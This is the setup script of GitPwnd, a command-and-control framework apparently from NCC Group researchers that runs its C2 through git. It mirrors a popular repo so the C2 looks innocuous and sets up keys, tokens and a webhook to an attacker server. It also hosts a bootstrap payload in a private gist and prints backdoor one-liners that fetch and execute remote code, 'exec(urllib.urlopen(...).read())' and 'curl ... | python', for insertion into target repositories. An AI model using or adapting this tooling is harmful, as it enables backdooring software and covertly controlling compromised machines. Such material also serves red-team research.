import os
import shutil
import subprocess
import github
from github import Github, GithubException
from subprocess import Popen, PIPE, STDOUT
import argparse
import yaml
import sys
import string
import uuid

import ipdb

LOGO = """
############################################
   _____ _ _   _____                     _
  / ____(_) | |  __ \                   | |
 | |  __ _| |_| |__) |_      ___ __   __| |
 | | |_ | | __|  ___/\ \ /\ / / '_ \ / _` |
 | |__| | | |_| |     \ V  V /| | | | (_| |
  \_____|_|\__|_|      \_/\_/ |_| |_|\__,_|

############################################
by Clint Gibler and Noah Beddome of NCC Group
"""

SETUP_DIR = "data"  # where we store various setup files, like the initial clone of c2 repo
REPO_DIR = os.path.abspath(os.path.join(SETUP_DIR, "repos"))
SSH_KEY_DIR = os.path.abspath(os.path.join(SETUP_DIR, "ssh_keys"))

def print_logo():
    print(LOGO)

def print_initial_overview():
    overview = """
############
# Overview #
############
Here's how GitPwnd works... TODO
...
See Black Hat talk slides/whitepaper for details TODO.
"""

    requirements = """
################
# Requirements #
################
TODO: make this thorough and complete

You're going to need the following to run GitPwnd:
* A GitHub account with the ability to create private repos.
  * An API access key for that GitHub account
* A second GitHub account.
    * SSH keys for this account will be distributed to compromised machines,
      so minimize the other repos this GitHub account has access to.
* A network-accessible server, for example hosted on AWS, DigitalOcean, etc.
* A link to a popular open source repo that logically fits into the ecosystem of your target.
* TODO...
"""
    print(overview)
    print(requirements)


def print_intro():
    print_logo()
    print_initial_overview()

def setup(setup_dir):
    print("Running setup...")
    print("[*] Making directory to store intermediate setup files: %s" % os.path.abspath(setup_dir))
    if not os.path.exists(setup_dir):
        os.makedirs(setup_dir)

    print("[*] Making directories to store git repos and generated SSH keys...")
    for d in [REPO_DIR, SSH_KEY_DIR]:
        print("- %s" % d)
        if not os.path.exists(d):
            os.makedirs(d)

    # Make sure git is installed
    git_path = shutil.which("git")
    if git_path is None:
        print("[!] git not installed. Please install git to use GitPwnd")
        exit(1)

def create_c2_repo(setup_dir, config):
    msg = """
#########################################
# Creating command and control git repo #
#########################################
We're going to clone a popular git repo and use it for command and control;
that is, we'll push commands to compromised machines in the git repo, which the
victim machine will pull, run the commands, commit the results, then push,
which our server will then receive and store for your later viewing.

First, choose a popular open source repo in the language that your target uses.
For example, if you're targeting a company that predominantly uses Rails, choose
a popular Ruby gem.

The goal is to choose something that will look innocuous on compromised
machines if a developer or sys admin is reviewing installed libraries.
"""

    print(msg)

    # TODO: break this into sub methods or sub classes

    ############################################################
    # Get the name of benign repo we're going to mirror for c2 #
    ############################################################
    if not "benign_repo" in config:
        benign_repo = input("Enter the git clone URL of a popular repo: ")
        benign_repo = benign_repo.strip()
        config["benign_repo"] = benign_repo

    config["benign_repo_name"] = config["benign_repo"].split("/")[-1].replace(".git", "")
    config["benign_repo_path"] = os.path.abspath(os.path.join(setup_dir, config["benign_repo_name"]))

    try:
        print("[*] Cloning repo to: %s" % config["benign_repo_path"])

        if os.path.exists(config["benign_repo_path"]):
            print("[?] Looks like benign repo has already been cloned, skipping")
            print("  If this is incorrect, please delete: %s" % config["benign_repo_path"])
        else:
            clone_output = subprocess.check_output("git clone %s %s" %
                                                   (config["benign_repo"], config["benign_repo_path"]), shell=True)
    except subprocess.CalledProcessError:
        print("[!] Error cloning")
        print(clone_output)
        exit(1)

    print("""
Now we're going to mirror the history of the benign repo you just provided in
git repo you control, which will be used for command and control.

In order for this script to automatically set up the command and control GitHub
repo for you, you'll need to provide a GitHub personal access token.

Perform the following steps to create a GitHub personal access token:
1. Log into GitHub.
2. Click on your profile icon in the top right and select "Settings."
3. Click on "Personal access tokens" under Developer settings on the left.
4. Give the token a description and the following permissions:
   - The top-level checkbox for "repo"
   - The top-level checkbox for "admin:repo_hook"
   - "gist"
   - "delete_repo"
5. Click the "Generate token" button.

NOTE: this setup script does not save this access token, so make sure to save a
copy somewhere safe if you want to re-run this script later.

""")

    if not "main_github_token" in config:
        config["main_github_token"] = input("Please enter your GitHub personal access token: ")

    g = Github(config["main_github_token"])
    g_user = g.get_user()
    config["main_github_username"] = g_user.login

    if not "github_c2_repo_name" in config:
        config["github_c2_repo_name"] = input("Enter the name of the c2 repo to create on GitHub (%s): " % config["benign_repo_name"])
    # Default to the name of the benign repo
    if config["github_c2_repo_name"] == "":
        config["github_c2_repo_name"] = config["benign_repo_name"]


    should_sync_c2_history = True # are we going to push the benign git history to the newly created c2 git repo?

    print("[*] Creating private GitHub repo: %s/%s" % (config["main_github_username"], config["github_c2_repo_name"]) )
    try:
        config["github_c2_git_url"] = "https://github.com/%s/%s.git" % (config["main_github_username"], config["github_c2_repo_name"])
        benign_description = g.get_repo("/".join(config["benign_repo"].split("/")[-2:]).replace(".git", "")).description
        g_repo = g_user.create_repo(config["github_c2_repo_name"], description=benign_description, private=True)
        # g_repo.git_url - this will be like: git://github.com/username/repo.git
        # Can't use ^, need to use https:// git path so we can use the token

    except GithubException as gexc:
        if gexc.data["errors"][0]["message"] == "name already exists on this account":
            print("[!] There's already a repo with this name.")
            choice = input("[?] Leave this repo alone and continue? (y/n): ")

            if choice.lower() == "y":
                should_sync_c2_history = False
            else:
                choice = input("[?] Delete this repo? (y/n): ")
                if choice.lower() == "y":
                    try:
                        g_repo = g.get_repo("%s/%s" % (config["main_github_username"], config["github_c2_repo_name"]))
                        g_repo.delete()
                        print("[!] Deletion successful! Please re-run the setup script.")
                    except GithubException as gexc:
                        print("[!] %s" % (gexc.data["errors"][0]["message"]))
                        exit(1)
                else:
                    print("[!] Please delete this repo and re-run the setup script")
                    exit(1)
        else:
            print("[!] Creating repo failed.")
            ipdb.set_trace()
            print("  - Can your account create private repos?")
            exit(1)
    except Exception as exc:
        print("[!] Creating repo failed.")
        ipdb.set_trace()
        exit(1)


    if should_sync_c2_history:
        sync_c2_history(config)
    else:
        print("[*] Skipping sending the benign git repo's history to the newly created repo")

    return config

# Sync the history of the newly created private GitHub repo used for command and control
# with the history of the benign repo, to make it seem innocuous on disk.
def sync_c2_history(config):
    print("[*] Syncing the benign git repo's history to the newly created repo")
    orig_dir = os.path.abspath(os.curdir)

    # cd into cloned git repo to do git munging there
    os.chdir(config["benign_repo_path"])

    config["primary_clone_url"] = "https://%s@github.com/%s/%s.git" % (config["main_github_token"],
      config["main_github_username"], config["github_c2_repo_name"])

    # Push history and tags
    subprocess.check_output("git push --all --repo " + config["primary_clone_url"], shell=True)
    subprocess.check_output("git push --tags --repo " + config["primary_clone_url"], shell=True)

    # Make this local git repo point to our new c2 repo on GitHub
    subprocess.check_output("git remote remove origin", shell=True)
    subprocess.check_output("git remote add origin " + config["primary_clone_url"], shell=True)
    subprocess.check_output("git pull origin master", shell=True)
    subprocess.check_output("git branch --set-upstream-to=origin/master master", shell=True)

    os.chdir(orig_dir)

def get_secondary_account_access_token(config):
    if not "secondary_github_token" in config:
        tmp = input("[*] Please enter a personal access token for a secondary GitHub account: ")
        config["secondary_github_token"] = tmp.strip()

    return config

def generate_ssh_key_for_c2_repo(config):
    print("""
#########################
# Creating SSH Key Pair #
#########################
This will be added to the secondary GitHub account and distributed
to compromised machines.
""")
    passwd = "" # Don't use a password for the SSH key
    email = "john.doe@example.com"

    # Provide a default value, don't want to overwhelm people with options
    if not "ssh_key_name" in config:
        config["ssh_key_name"] = "gitpwnd"

    config["ssh_key_path"] = os.path.join(SSH_KEY_DIR, config["ssh_key_name"])

    if os.path.exists(config["ssh_key_path"]):
        print("[!] SSH key already exists, continuing without generating a new one")
    else:
        print("[*] Generating new SSH key pair")
        subprocess.check_output("ssh-keygen -P '" + passwd + "' -f " + config["ssh_key_path"] + " -C " + email, shell=True)

    print("- %s" % config["ssh_key_path"])
    print("")

    return config


def add_ssh_key_to_github_account(github_token, ssh_key_path):
    pub_key_contents = open(ssh_key_path + ".pub", 'r').read().strip()
    pub_key_no_comment = " ".join(pub_key_contents.split(" ")[0:2])

    g = Github(github_token)
    g_user = g.get_user()

    # Check if we've already added this key
    if not pub_key_no_comment in [key_obj.key for key_obj in g_user.get_keys()]:
        print("[*] Adding generated key to: %s" % g_user.login)
        g_user.create_key("gitpwnd", pub_key_contents)
    else:
        print("[!] Looks like %s already has this public key, not adding it to account" % g_user.login)

# Add the secondary user to the git c2 repo as a collaborator
def add_collaborator(main_github_token, github_c2_repo_name, secondary_github_token):
    g = Github(main_github_token)
    g_user = g.get_user()
    repo = g_user.get_repo(github_c2_repo_name)

    g2 = Github(secondary_github_token)
    g2_user = g2.get_user()

    repo.add_to_collaborators(g2_user.login)


def create_private_gist(config, main_github_token, filename, content, description):
    g = Github(main_github_token)
    g_user = g.get_user()
    gist = g_user.create_gist(False, {filename: github.InputFileContent(content)}, description)

    # gists have a list of files associated with them, we just want the first one
    # gist.files = {'filename': GistFile(filename), ...}
    gist_file = [x for x in gist.files.values()][0]
    config["gist_raw_contents_url"] = gist_file.raw_url

    # The structure of the url is:
    # https://gist.githubusercontent.com/<username>/<gist guid>/raw/<file guid>/<filename.txt>
    #
    # Since we're only uploading one file and we want to make the URL as concise as possible,
    # it turns out we can actually trim off everything after /raw/ and it'll still give us what
    # we want.
    config["gist_raw_contents_url"] = config["gist_raw_contents_url"].split("/raw/")[0] + "/raw"

    print("[*] Private gist content at:")
    print("- %s" % config["gist_raw_contents_url"])

    return config

# Return the content that will placed in the private gist
def get_bootstrap_content(config):
    bootstrap_file = os.path.abspath(os.path.join(__file__, "..", "gitpwnd", "bootstrap.py.template"))

    params = {"repo_clone_url":      config["secondary_clone_url"],
              "benign_repo":         config["benign_repo"],
              "github_c2_repo_name": config["github_c2_repo_name"]}

    with open(bootstrap_file, 'r') as f:
        templatized_bootstrap_file = string.Template(f.read())

    return templatized_bootstrap_file.safe_substitute(params)

#     return """
# with open("/tmp/gitpwnd", "w") as f:
#     f.write("owned")
# """

# After all the setup has been done, get the one liner that should be placed in a repo
def get_python_one_liner(gist_url):
    # Note that `exec` is required for multiline statements, eval seems to only do simple expressions
    # https://stackoverflow.com/questions/30671563/eval-not-working-on-multi-line-string
    return "import urllib; exec(urllib.urlopen('%s').read())" % gist_url

def print_backdoor_instructions(config):
    gist_url = config["gist_raw_contents_url"]
    print("""
######################
# Backdoor one-liner #
######################

[*] Insert the following into the target git repo you're backdooring:

# Python
%s

You can also do something like:
  $ curl %s | python

""" % (get_python_one_liner(gist_url), gist_url))

# Replace agent.py.template with customized info, copy to c2 repo,
# git add, commit, and push it so that the bootstrap.py gist can install
# it on compromised machines
def copy_agent_to_c2_repo(config):
    agent_file = os.path.abspath(os.path.join(__file__, "..", "gitpwnd", "agent.py.template"))

    params = {"repo_clone_url": config["secondary_clone_url"],
              "remote_repo_name": "features",             # we add the c2 repo as a remote
              "remote_repo_master_branch": "master"}

    _add_file_to_c2_repo(config, agent_file, params, "agent.py")

def copy_payload_to_c2_repo(config):
    payload_file = os.path.abspath(os.path.join(__file__, "..", "gitpwnd", "payload.py.template"))
    params = {}
    _add_file_to_c2_repo(config, payload_file, params, "payload.py")


def _add_file_to_c2_repo(config, template_file_path, params, dest_path_in_c2_repo):
    with open(template_file_path, 'r') as f:
        templatized_file = string.Template(f.read())

    dest_file = os.path.join(config["benign_repo_path"], dest_path_in_c2_repo)

    with open(dest_file, "w") as f:
        f.write(templatized_file.safe_substitute(params))

    # Add agent.py to the c2 repo #
    orig_dir = os.path.abspath(os.curdir)
    # cd into cloned git repo to do git munging there
    os.chdir(config["benign_repo_path"])

    # Add agent.py and push
    subprocess.check_output("git add %s" % dest_path_in_c2_repo, shell=True)
    subprocess.check_output("git commit -m 'Add %s'" % dest_path_in_c2_repo, shell=True)
    subprocess.check_output("git push --repo %s" % config["primary_clone_url"], shell=True)

    os.chdir(orig_dir)

def create_c2_webhook(config):
    print("[*] Creating GitHub webhook for C2 repo that will receive pushes from compromised machines ")

    g = Github(config["main_github_token"])
    g_user = g.get_user()
    repo = g_user.get_repo(config["github_c2_repo_name"])

    # this endpoint is defined in server/gitpwnd/controllers.py
    webhook_endpoint = config["attacker_server"] + "/api/repo/receive_branch"

    # We're using a self-signed cert, so we need to turn off TLS verification for now :(
    # See the following for details: https://developer.github.com/v3/repos/hooks/#create-a-hook
    hook_secret = str(uuid.uuid4())
    params = {"url": webhook_endpoint, "content_type": "json", "secret": hook_secret, "insecure_ssl": "1"}

    #  PyGithub's create_hook doc:
    # http://pygithub.readthedocs.io/en/latest/github_objects/Repository.html?highlight=create_hook
    try:
        repo.create_hook("web", params, ["push"], True)
    except:
        print("[!] Web hook already exists")
        hook = repo.get_hooks()[0]
        if "secret" not in hook.config.keys():
            print("[!] Adding a secret to the hook...")
        else:
            hook_secret = input("Enter webhook secret (Github Repo > Settings > Webhooks > Edit > Inspect 'Secret' element): ")
        new_hook_config = hook.config
        new_hook_config["secret"] = hook_secret
        hook.edit(name=hook.name, config=new_hook_config)
    finally:
        return hook_secret


# Automatically generate a new password for the gitpwnd server
# so we don't use a default one
def customize_gitpwnd_server_config(config):
    print("[*] Generating a unique password for the gitpwnd server")
    server_creds_template_file = os.path.abspath(os.path.join(__file__, "..", "server", "server_creds.yml.template"))
    output_file = server_creds_template_file.replace(".template", "")

    with open(server_creds_template_file, 'r') as f:
        templatized_creds_file = string.Template(f.read())

    params = {"basic_auth_password": str(uuid.uuid4()),
              "benign_repo_path": config["benign_repo_path"],
              "hook_secret": config["hook_secret"]}
    with open(output_file, 'w') as f:
        f.write(templatized_creds_file.safe_substitute(params))

def print_accept_c2_invitation_instructions():
    print("""IMPORTANT: Check the email for the secondary user and "accept"
the invitation to the newly created command and control repo.

Without doing this, the bootstrapping process executed on compromised machines
will fail.
""")

# The overall flow of the setup process
def main(setup_dir, repo_dir, ssh_key_dir):
    print_intro()
    print("""
----------------------------------

######################################
# Beginning GitPwnd setup process... #
######################################
""")

    # Usage: python3 setup.py <optional path to config.yml>
    if len(sys.argv) > 1:
        with open(sys.argv[1], 'r') as f:
            config = yaml.load(f)



    setup(setup_dir)
    config = create_c2_repo(repo_dir, config)
    config = get_secondary_account_access_token(config)
    config = generate_ssh_key_for_c2_repo(config)
    add_ssh_key_to_github_account(config["secondary_github_token"], config["ssh_key_path"])

    add_collaborator(config["main_github_token"], config["github_c2_repo_name"], config["secondary_github_token"])

    hook_secret = create_c2_webhook(config)
    config["hook_secret"] = hook_secret

    customize_gitpwnd_server_config(config)


    # the clone URL compromised machines will use
    config["secondary_clone_url"] = "https://%s@github.com/%s/%s.git" % (config["secondary_github_token"],
                                                          config["main_github_username"],
                                                          config["github_c2_repo_name"])


    gist_content = get_bootstrap_content(config)

    config = create_private_gist(config, config["main_github_token"],
               "install.sh", gist_content, "Some description")

    copy_agent_to_c2_repo(config)

    copy_payload_to_c2_repo(config)

    print_backdoor_instructions(config)
    print_accept_c2_invitation_instructions()

if __name__ == "__main__":
    main(SETUP_DIR, REPO_DIR, SSH_KEY_DIR)
